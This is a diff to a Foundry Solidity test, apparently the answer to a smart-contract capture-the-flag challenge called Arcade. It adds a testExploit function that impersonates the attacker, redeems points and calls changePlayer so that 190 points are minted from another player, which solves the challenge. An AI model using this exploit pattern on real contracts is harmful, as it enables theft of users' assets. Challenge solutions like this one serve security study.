@@ -76,5 +76,16 @@ contract ArcadeTest is Test {
         assertEq(arcade.currentPlayer(), player1);
     }
 
-    function testExploit() public {}
+    function testExploit() public {
+        //
+        vm.warp(10 minutes);
+        vm.startPrank(you);
+        arcade.earn();
+        arcade.redeem(); // mint 10 points
+        arcade.changePlayer(player4); // mint 190 points from `player4`
+        //
+        arcadeBase.solve();
+        assertTrue(arcadeBase.isSolved());
+        vm.stopPrank();
+    }
 }
